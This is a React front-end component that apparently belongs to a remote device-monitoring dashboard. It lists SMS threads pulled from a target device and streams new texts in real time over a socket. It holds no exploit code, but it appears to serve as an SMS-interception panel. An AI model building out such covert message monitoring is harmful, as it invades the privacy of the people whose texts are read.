import React, { useEffect, useState, useRef } from "react";
import { useTranslation } from "react-i18next";
import { useMediaQuery } from "react-responsive";
import toast from "react-hot-toast";

import {
  Grid,
  Typography,
  CircularProgress,
  Box,
  Avatar,
  TextField,
  IconButton,
} from "@mui/material";

import { useSocket } from "../../hooks/use-socket";
import MonitorViewer from "../monitorViewer";

import { formatDateTime } from "src/utils/common";
import { getMessageList, getAllSMSByPhoneNumber } from "src/store/actions/sms.action";

import SendIcon from "@mui/icons-material/Send";
import SmsIcon from "@mui/icons-material/Sms";
import HourglassEmptyIcon from "@mui/icons-material/HourglassEmpty";

import Color from "src/theme/colors";

const SMSManager = ({ label, device, onClose }) => {
  const { t } = useTranslation();
  const { socket } = useSocket();

  const isTablet = useMediaQuery({ query: "(max-width: 1024px) and (min-width: 476px)" });

  const [smsList, setSMSList] = useState([]);
  const [selectedSMS, setSelectedSMS] = useState([]);
  const [allMessages, setAllMessages] = useState([]);

  const [state, setState] = useState({
    width: isTablet ? 500 : 800,
    height: isTablet ? 600 : 700,
    x: isTablet ? 20 : 50,
    y: isTablet ? -400 : -120,
    minWidth: isTablet ? 400 : 500,
    minHeight: 400,
    maxWidth: 800,
    maxHeight: 700,
  });

  useEffect(() => {
    init();
  }, []);

  useEffect(() => {
    const handleResize = () => {
      if (window.innerWidth < 720) {
        setState((prevState) => ({
          ...prevState,
          width: window.innerWidth - 20, // Account for padding
          height: window.innerWidth - 20, // Keep it square
        }));
      } else {
        setState((prevState) => ({
          ...prevState,
          width: 720,
          height: 720,
        }));
      }
    };

    window.addEventListener("resize", handleResize);
    handleResize();

    return () => {
      window.removeEventListener("resize", handleResize);
    };
  }, []);

  const init = async () => {
    try {
      const deviceId = device?.deviceId;
      const response = await getMessageList(deviceId);
      if (response && Array.isArray(response)) {
        setSMSList(response);
      }

      socket.on(`sms-manager-shared-${deviceId}`, onAllSMSResponse);
    } catch (error) {
      toast.error(t("toast.error.server-error"), {
        position: "bottom-center",
        reverseOrder: false,
        duration: 5000,
        style: {
          backgroundColor: Color.background.red_gray01,
          borderRadius: "5px",
          padding: "3px 10px",
        },
      });
    }
  };

  const onAllSMSResponse = (data) => {
    // Check if the incoming message is from the current device
    if (device?.deviceId === data?.response?.deviceId) {
      // If it's a new phone number, add a new SMS entry to the top of the list and show toast
      toast.success(`${t("toast.success.add-new-sms")} ${data?.response?.phonenumber} `, {
        position: "bottom-right",
        reverseOrder: false,
        duration: 5000,
        style: {
          border: `solid 1px ${Color.background.purple}`,
          backgroundColor: Color.background.purple_opacity,
          color: Color.text.primary,
          borderRadius: "0px",
          padding: "2px 10px",
          fontSize: "16px",
        },
      });

      setSMSList((prevSMSList) => {
        // Find if the SMS phone number already exists in the list
        const existingSMSIndex = prevSMSList.findIndex(
          (sms) => sms.phoneNumber === data.response.phonenumber
        );

        // If the phone number exists, update the last message and flag it as new
        if (existingSMSIndex >= 0) {
          const updatedSMSList = [...prevSMSList];
          updatedSMSList[existingSMSIndex] = {
            ...updatedSMSList[existingSMSIndex],
            hasNewMessage: true,
            lastMessage: data.response.message,
          };

          // Bring the updated message to the top of the list by reordering
          const [updatedSMS] = updatedSMSList.splice(existingSMSIndex, 1);
          updatedSMSList.unshift(updatedSMS);

          // Update the `allMessages` state if the incoming SMS belongs to the currently selected conversation
          setAllMessages((prevAllMessages) => {
            // Check if the selected SMS matches the incoming message's phone number
            if (selectedSMS?.phoneNumber === data.response.phonenumber) {
              return [
                {
                  phoneNumber: data.response.phonenumber,
                  message: data.response.message,
                  createdAt: new Date(),
                },
                ...prevAllMessages, // Keep old messages intact
              ];
            }
            return prevAllMessages; // No changes if the message doesn't belong to the current conversation
          });

          return updatedSMSList;
        }

        // Add new SMS to `allMessages` if it's the current conversation
        setAllMessages((prevAllMessages) => {
          if (selectedSMS?.phoneNumber === data.response.phonenumber) {
            return [
              {
                phoneNumber: data.response.phonenumber,
                message: data.response.message,
                createdAt: new Date(),
              },
              ...prevAllMessages,
            ];
          }
          return prevAllMessages;
        });

        return [
          {
            phoneNumber: data.response.phonenumber,
            lastMessage: data.response.message,
            createdAt: new Date(),
            hasNewMessage: true,
            deviceId: data.response.deviceId,
          },
          ...prevSMSList,
        ];
      });
    }
  };

  const onSelectSMS = async (sms) => {
    setSelectedSMS(sms);
    try {
      const deviceId = sms?.deviceId;
      const phoneNumber = sms?.phoneNumber;

      const response = await getAllSMSByPhoneNumber({ deviceId, phoneNumber });
      if (response.success == true) {
        setAllMessages(response.allSms);

        // Remove the new message badge when the user selects the SMS
        setSMSList((prevSMSList) =>
          prevSMSList.map((item) =>
            item.phoneNumber === phoneNumber ? { ...item, hasNewMessage: false } : item
          )
        );
      }
    } catch (error) {
      toast.error(t("toast.error.server-error"), {
        position: "bottom-center",
        reverseOrder: false,
        duration: 5000,
        style: {
          backgroundColor: Color.background.red_gray01,
          borderRadius: "5px",
          padding: "3px 10px",
        },
      });
    }
  };

  const onCloseModal = async () => {
    onClose(false);
  };

  return (
    <MonitorViewer initialState={state} onClose={onCloseModal}>
      <div style={{ position: "relative", width: "100%", height: "100%" }}>
        <Box
          sx={{
            display: "flex",
            flexDirection: { md: "row", xs: "column" },
            overflowY: "auto",
            height: "100%",
            py: { md: 1, xs: 5 },
            gap: "15px",
          }}
        >
          <div
            style={{
              flex: "40%",
              overflowY: "auto",
              border: `solid 1px ${Color.background.border}`,
              borderRadius: "5px",
              padding: "10px 5px",
              height: "100%",
            }}
          >
            <div style={{ backgroundColor: Color.background.main, height: "100%" }}>
              {smsList?.length === 0 ? (
                <Box
                  sx={{
                    height: "100%",
                    display: "flex",
                    flexDirection: "column",
                    justifyContent: "center",
                    alignItems: "center",
                  }}
                >
                  <Typography style={{ color: Color.text.secondary }}>
                    {t("devicesPage.managers.sms-list-empty")}
                  </Typography>
                </Box>
              ) : (
                smsList?.map((smslist, index) => (
                  <Box
                    key={index}
                    onClick={() => onSelectSMS(smslist)}
                    sx={{
                      cursor: "pointer",
                      marginBottom: "2px",
                      color: Color.text.primary,
                      border: `solid 1px ${
                        selectedSMS?._id === smslist?._id
                          ? Color.text.purple
                          : Color.background.main
                      }`,
                      backgroundColor:
                        selectedSMS?._id === smslist?._id
                          ? Color.background.purple_opacity
                          : "initial",
                      padding: "5px",
                      transition: "background-color 0.1s",
                      "&:hover": {
                        backgroundColor: Color.background.purple_opacity,
                      },
                    }}
                  >
                    <Box sx={{ width: "100%" }}>
                      <Box sx={{ display: "flex", justifyContent: "space-between" }}>
                        <Typography sx={{ fontSize: "16px" }}>{smslist?.phoneNumber}</Typography>
                        {smslist.hasNewMessage && (
                          <Box>
                            <Typography
                              sx={{
                                backgroundColor: Color.background.green,
                                color: Color.text.purple,
                                mt: "2px",
                                px: "5px",
                                py: "0px",
                                fontSize: "10px",
                                borderRadius: "3px",
                              }}
                            >
                              New
                            </Typography>
                          </Box>
                        )}
                      </Box>

                      <Typography
                        sx={{
                          fontSize: "14px",
                          color: Color.text.secondary,
                          width: "100px",
                          overflow: "hidden",
                          whiteSpace: "nowrap",
                          textOverflow: "ellipsis",
                          pl: 1,
                        }}
                      >
                        {smslist?.lastMessage}
                      </Typography>
                    </Box>
                  </Box>
                ))
              )}
            </div>
          </div>

          <div
            style={{
              flexBasis: "70%",
              display: "flex",
              justifyContent: "center",
              alignItems: "center",
              overflow: "hidden",
              border: `solid 1px ${Color.background.border}`,
              borderRadius: "5px",
            }}
          >
            {allMessages ? (
              <div
                style={{
                  display: "flex",
                  flexDirection: "column",
                  justifyContent: "center",
                  alignItems: "center",
                  width: "100%",
                  height: "100%",
                }}
              >
                {/* Chat Messages Area */}
                <Box
                  sx={{
                    flex: 1,
                    padding: "10px",
                    overflowY: "auto",
                    backgroundColor: Color.background.chatBackground,
                    borderRadius: "8px",
                    width: "100%",
                  }}
                >
                  {allMessages?.map((message, index) => (
                    <Box
                      key={index}
                      sx={{
                        display: "flex",
                        alignItems: "flex-end",
                        justifyContent: "flex-start",
                        marginBottom: "15px",
                      }}
                    >
                      <Box
                        sx={{
                          backgroundColor: Color.background.purple_opacity01,
                          padding: "10px 15px",
                          border: `solid 1px ${Color.background.purple_opacity01}`,
                          borderTopLeftRadius: "0px",
                          borderTopRightRadius: "10px",
                          borderBottomRightRadius: "10px",
                          borderBottomLeftRadius: "10px",
                          color: "white",
                          maxWidth: "60%",
                        }}
                      >
                        <Typography sx={{ fontSize: "18px", textAlign: "left" }}>
                          {message.message}
                        </Typography>
                        <Typography
                          sx={{
                            width: "100%",
                            fontSize: "10px",
                            color: Color.text.secondary,
                            textAlign: "right",
                          }}
                        >
                          {formatDateTime(message.created_at)}
                        </Typography>
                      </Box>
                    </Box>
                  ))}
                </Box>

                {/* Message Input Area */}
              </div>
            ) : (
              <Typography sx={{ fontSize: "14px", textAlign: "center", color: "white" }}>
                {t("devicesPage.managers.gallery-select-image")}
              </Typography>
            )}
          </div>
        </Box>
      </div>
    </MonitorViewer>
  );
};

export default SMSManager;
